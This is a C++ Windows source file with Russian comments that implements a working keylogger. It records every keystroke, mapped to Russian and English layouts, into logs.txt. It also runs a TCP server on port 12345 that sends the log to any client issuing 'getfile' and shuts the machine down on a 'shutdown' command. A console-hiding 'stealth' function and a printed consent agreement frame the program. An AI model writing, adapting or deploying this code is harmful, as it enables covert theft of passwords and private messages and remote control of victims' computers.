#include <iostream>
#include <fstream>
#include <string>
#include <ctime>
#include <locale>
#include <codecvt>
#include <mutex>
#include <thread>
#include <cstring>
#include <vector>
#include <winsock2.h>
#include <windows.h>
#include <sstream>
#pragma comment(lib, "ws2_32.lib")

std::mutex mtx;
bool is_capslock = false;
int BackSp = 0;  //Переменная для BackSpace

enum class Language
{
    UNKNOWN = -1,
    RUSSIAN,
    ENGLISH
};

Language getLanguage()
{
    HKL layoutid = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
    LANGID  langid = LOWORD(layoutid);

    if (langid == MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US) || langid == MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_UK)) {
        return Language::ENGLISH;
    }
    else if (langid == MAKELANGID(LANG_RUSSIAN, SUBLANG_DEFAULT)) {
        return Language::RUSSIAN;
    }

    return Language::UNKNOWN;
}

//Начало. Запись лога.
int save(int key, Language lang)
{
    std::cout << key << " ";
    std::ofstream out_file("logs.txt", std::ios_base::app | std::ios_base::out);
    out_file.imbue(std::locale(out_file.getloc(), new std::codecvt_utf8<wchar_t>));
    std::string sLogs = "";
    time_t t = time(0);
    //Конец. Запись лога.
    


    switch (key) {

        //Начало. Цифровая клавиатура.
        //Почему case не с 1&  Потому как используется десятичное число кодов клавиш.
        //Клавиша 0 (ноль) имеет код 96
    case 96:
        BackSp = 0;
        sLogs += "0";
        break;
    case 97:
        BackSp = 0;
        sLogs += "1";
        break;
    case 98:
        BackSp = 0;
        sLogs += "2";
        break;
    case 99:
        BackSp = 0;
        sLogs += "3";
        break;
    case 100:
        BackSp = 0;
        sLogs += "4";
        break;
    case 101:
        BackSp = 0;
        sLogs += "5";
        break;
    case 102:
        BackSp = 0;
        sLogs += "6";
        break;
    case 103:
        BackSp = 0;
        sLogs += "7";
        break;
    case 104:
        BackSp = 0;
        sLogs += "8";
        break;
    case 105:
        BackSp = 0;
        sLogs += "9";
        break;
        // Конец. Цифровая клавиатура

        //Начало. Клавиатура вверху.
    case 48:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            sLogs += ")";
        }
        else
            sLogs += "0";
        break;
    case 49:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            sLogs += "!";
        }
        else
            sLogs += "1";
        break;
    case 50:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            sLogs += "@";
        }
        else
            sLogs += "2";
        break;
    case 51:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            sLogs += "#";
        }
        else
            sLogs += "3";
        break;
    case 52:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            sLogs += "$";
        }
        else
            sLogs += "4";
        break;
    case 53:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            sLogs += "%";
        }
        else
            sLogs += "5";
        break;
    case 54:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            sLogs += "^";
        }
        else
            sLogs += "6";
        break;
    case 55:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            sLogs += "&";
        }
        else
            sLogs += "7";
        break;
    case 56:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            sLogs += "*";
        }
        else
            sLogs += "8";
        break;
    case 57:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            sLogs += "(";
        }
        else
            sLogs += "9";
        break;
        //Конец. Клавиатура вверху

        //Начало. Ввод набора букв с клавиатуры.
        //Используем таблицу символов Юников (Unicode)
        //Например, код &#260 соответствует латинской заглавной букве А

    case 65:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Ф";
                break;
            }
            else
                sLogs += "ф";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "A";
                break;
            }
            else
                sLogs += "a";
        }
        break;

    case 66:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "И";
                break;
            }
            else
                sLogs += "и";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "B";
                break;
            }
            else
                sLogs += "b";
        }
        break;

    case 67:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "С";
                break;
            }
            else
                sLogs += "с";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "C";
                break;
            }
            else
                sLogs += "c";
        }
        break;

    case 68:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "В";
                break;
            }
            else
                sLogs += "в";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "D";
                break;
            }
            else
                sLogs += "d";
        }
        break;

    case 69:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "У";
                break;
            }
            else
                sLogs += "у";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "E";
                break;
            }
            else
                sLogs += "e";
        }
        break;

    case 70:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "А";
                break;
            }
            else
                sLogs += "а";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "F";
                break;
            }
            else
                sLogs += "f";
        }
        break;

    case 71:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "П";
                break;
            }
            else
                sLogs += "п";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "G";
                break;
            }
            else
                sLogs += "g";
        }
        break;

    case 72:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Р";
                break;
            }
            else
                sLogs += "р";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "H";
                break;
            }
            else
                sLogs += "h";
        }
        break;

    case 73:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Ш";
                break;
            }
            else
                sLogs += "ш";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "I";
                break;
            }
            else
                sLogs += "i";
        }
        break;

    case 74:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "О";
                break;
            }
            else
                sLogs += "о";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "J";
                break;
            }
            else
                sLogs += "j";
        }
        break;

    case 75:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Л";
                break;
            }
            else
                sLogs += "л";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "K";
                break;
            }
            else
                sLogs += "k";
        }
        break;

    case 76:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Д";
                break;
            }
            else
                sLogs += "д";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "L";
                break;
            }
            else
                sLogs += "l";
        }
        break;

    case 77:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Ь";
                break;
            }
            else
                sLogs += "ь";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "M";
                break;
            }
            else
                sLogs += "m";
        }
        break;

    case 78:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Т";
                break;
            }
            else
                sLogs += "т";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "N";
                break;
            }
            else
                sLogs += "n";
        }
        break;

    case 79:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Щ";
                break;
            }
            else
                sLogs += "щ";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "O";
                break;
            }
            else
                sLogs += "o";
        }
        break;

    case 80:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "З";
                break;
            }
            else
                sLogs += "з";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "P";
                break;
            }
            else
                sLogs += "p";
        }
        break;

    case 81:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Й";
                break;
            }
            else
                sLogs += "й";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Q";
                break;
            }
            else
                sLogs += "q";
        }
        break;

    case 82:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "К";
                break;
            }
            else
                sLogs += "к";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "R";
                break;
            }
            else
                sLogs += "r";
        }
        break;

    case 83:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Ы";
                break;
            }
            else
                sLogs += "ы";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "S";
                break;
            }
            else
                sLogs += "s";
        }
        break;

    case 84:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Е";
                break;
            }
            else
                sLogs += "е";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "T";
                break;
            }
            else
                sLogs += "t";
        }
        break;

    case 85:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Г";
                break;
            }
            else
                sLogs += "г";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "U";
                break;
            }
            else
                sLogs += "u";
        }
        break;

    case 86:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "М";
                break;
            }
            else
                sLogs += "м";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "V";
                break;
            }
            else
                sLogs += "v";
        }
        break;

    case 87:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Ц";
                break;
            }
            else
                sLogs += "ц";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "W";
                break;
            }
            else
                sLogs += "w";
        }
        break;

    case 88:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Ч";
                break;
            }
            else
                sLogs += "ч";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "X";
                break;
            }
            else
                sLogs += "x";
        }
        break;

    case 89:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Н";
                break;
            }
            else
                sLogs += "н";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Y";
                break;
            }
            else
                sLogs += "y";
        }
        break;

    case 90:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Я";
                break;
            }
            else
                sLogs += "я";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Z";
                break;
            }
            else
                sLogs += "z";
        }
        break;
    case 219:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Х";
                break;
            }
            else
                sLogs += "х";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "{";
                break;
            }
            else
                sLogs += "[";
        }
        break;

    case 221:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Ъ";
                break;
            }
            else
                sLogs += "ъ";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "}";
                break;
            }
            else
                sLogs += "]";
        }
        break;

    case 186:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Ж";
                break;
            }
            else
                sLogs += "ж";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += ":";
                break;
            }
            else
                sLogs += ";";
        }
        break;

    case 222:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Э";
                break;
            }
            else
                sLogs += "э";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "\"";
                break;
            }
            else
                sLogs += "'";
        }
        break;
    case 188:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Б";
                break;
            }
            else
                sLogs += "б";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "<";
                break;
            }
            else
                sLogs += ",";
        }
        break;

    case 190:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Ю";
                break;
            }
            else
                sLogs += "ю";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += ">";
                break;
            }
            else
                sLogs += ".";
        }
        break;
    case 192:
        BackSp = 0;
        if (lang == Language::RUSSIAN)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "Ё";
                break;
            }
            else
                sLogs += "ё";
        }
        else if (lang == Language::ENGLISH)
        {
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
            {
                sLogs += "~";
                break;
            }
            else
                sLogs += "`";
        }
        break;
        //Начало. Ввод набора букв с клавиатуры.
        //Десятичные коды клавиш.
    case 13:
        BackSp = 0;
        sLogs += "\n";
        break;
    case 20:
        BackSp = 0;
        if (is_capslock == false) {
            is_capslock = true;
            sLogs += " [CapsLock] ";
        }
        else {
            is_capslock = false;
            sLogs += " [/CapsLock] ";
        }
        break;
    case VK_BACK:
        BackSp += 1;
        sLogs += " [";
        sLogs += BackSp + '0';
        sLogs += "x";
        sLogs += "Backspace]";
        break;
    case VK_SPACE:
        BackSp = 0;
        sLogs += " ";
        break;
    case VK_MULTIPLY:
        BackSp = 0;
        sLogs += "*";
        break;
    case VK_ADD:
        BackSp = 0;
        sLogs += "+";
        break;
    case VK_SUBTRACT:
        BackSp = 0;
        sLogs += "-";
        break;
    case VK_DECIMAL:
        BackSp = 0;
        sLogs += ".";
        break;
    case VK_DIVIDE:
        BackSp = 0;
        sLogs += "/";
        break;
    default:
        break;
    }
    //Конец. Ввод набора букв с клавиатуры.
    out_file << sLogs; //Записывает данные
    out_file.close();  //Закрываем запись
    std::cout << sLogs << " ";
    std::cout << key << std::endl;;
    return 0;
}
//Начало. Видимость окна.
void stealth() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("consoleWindowClass", NULL);
    ShowWindow(stealth, 1);  //1-видим окно, 0 - невидмиое окно
}
//Конец. Видимость окна.


using namespace std;
std::vector<std::string> utf8_encode(int code) {
    std::vector<std::string> result;

    if (code < 128) {
        result.push_back(std::string(1, static_cast<char>(code)));
    }
    else {
        int num_bytes = 1;
        if (code >= 0x800)
            num_bytes++;
        if (code >= 0x10000)
            num_bytes++;

        std::stringstream ss;
        ss << static_cast<char>(0xC0 | ((code >> 6) & 0x1F));
        for (int i = 1; i < num_bytes; i++) {
            ss << static_cast<char>(0x80 | (code & 0x3F));
        }

        result.push_back(ss.str());
    }

    return result;
}
void handle_client(SOCKET client_socket) {
    char buffer[1024] = { 0 };
    int valread = recv(client_socket, buffer, 1024, 0);

    if (strncmp(buffer, "getfile", 7) == 0) {
        std::ifstream file("logs.txt", std::ios::binary);
        if (file) {
            std::vector<char> buffer(std::istreambuf_iterator<char>(file), {});

            int bytesSent = send(client_socket, buffer.data(), buffer.size(), 0);
        }
    }
    else if (strncmp(buffer, "shutdown", 8) == 0) {
        system("shutdown /s /t 0");
    }

    closesocket(client_socket);
}
int keylogger() {
    stealth();

    char buffer[MAX_PATH];
    ::GetModuleFileNameA(NULL, buffer, MAX_PATH);

    char i;
    while (1) {
        for (i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767)
            {
                mtx.lock();
                save(i, getLanguage());
                mtx.unlock();
            }
        }

    }
    return 0;
}

void printUserAgreement() {
    std::string userAgreement = R"SONG(ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ

Данное пользовательское соглашение (далее — "Соглашение") устанавливает условия использования программы, предназначенной для отслеживания нажатий клавиш на вашем компьютере или на устройстве с вашего согласия.

    Использование программы:
    1.1. Программа предназначена исключительно для мониторинга логов на компьютере или устройстве, согласие на использование которой дано владельцем устройства.
    1.2. Категорически запрещено использовать программу в незаконных целях, таких как незаконное получение информации или нарушение чужой конфиденциальности.
    Ответственность:
    2.1. Автор программы не несет ответственности за любые негативные последствия использования программы в целях, противоречащих условиям настоящего соглашения.
    Конфиденциальность и безопасность:
    3.1. Вся полученная программой информация должна храниться конфиденциально и не передаваться третьим лицам без согласия владельца устройства.
    3.2. Соблюдение мер безопасности и защиты данных на устройстве, где установлена программа, лежит на самом пользователе.
    Изменения и обновления:
    4.1. Автор оставляет за собой право вносить изменения в программу и условия настоящего соглашения без предварительного уведомления.
    Согласие:
    5.1. Используя данную программу, вы соглашаетесь с условиями данного соглашения.

Мы настоятельно рекомендуем внимательно ознакомиться с условиями настоящего соглашения перед началом использования программы. В случае несогласия с каким-либо из пунктов, прекратите использование программы немедленно.)SONG";

    // Печать пользовательского соглашения
    std::cout << userAgreement;
}
int keylog() {
    std::thread keyloggerThread(keylogger);
    keyloggerThread.detach();

    WSADATA wsa;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server, client;
    int client_addr_len = sizeof(client);

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    // Create a socket
    if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(12345);

    // Bind the socket
    if (bind(server_socket, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cerr << "Bind failed\n";
        return 1;
    }

    // Listen for incoming connections
    listen(server_socket, 5);
    std::cout << "Server running and waiting for connections...\n";

    while (true) {
        client_socket = accept(server_socket, (struct sockaddr*)&client, &client_addr_len);
        if (client_socket == INVALID_SOCKET) {
            std::cerr << "Accept failed\n";
            return 1;
        }

        std::cout << "Connection accepted from " << inet_ntoa(client.sin_addr) << ":" << ntohs(client.sin_port) << "\n";

        std::thread client_thread(handle_client, client_socket);
        client_thread.detach();
    }

    closesocket(server_socket);
    WSACleanup();
    return 0;
}

std::string makeClientRequest(const char* server_ip, int port, std::string message) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return "NOT!";
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Error creating socket\n";
        WSACleanup();
        return "NOT!";
    }

    SOCKADDR_IN serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(server_ip);
    serverAddr.sin_port = htons(port);

    if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed\n";
        closesocket(clientSocket);
        WSACleanup();
        return "NOT!";
    }



    send(clientSocket, message.c_str(), message.size(), 0);

    char buffer[1024] = { 0 };
    int valread = recv(clientSocket, buffer, 1024, 0);
    std::cout << "Ответ от сервера: " << buffer << std::endl;


    closesocket(clientSocket);
    WSACleanup();
    std::string answ(buffer);
    return answ;
}
int main() {
    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);
    printUserAgreement();


    std::cout << "\nВы согласны с условиями пользовательского соглашения? (да/нет): ";
    std::string userResponse;
    std::cin >> userResponse;

    if (userResponse != "да") {
        std::cout << "Вам необходимо согласиться с условиями пользовательского соглашения. Закрываем программу.\n";
        return 0;
    }

    std::cout << "Спасибо за ваше согласие. Продолжаем выполнение программы.\n";
    std::string message = "";
    std::string req = "";
    std::cin.clear();
    std::cin.ignore(32222, '\n');
    while (message.empty() && req != "NOT!")
    {
        std::cout << "Введите токен: ";
        std::getline(std::cin, message);
        req = makeClientRequest("127.0.0.1", 54321, message);
    }
    keylog();

    return 0;
}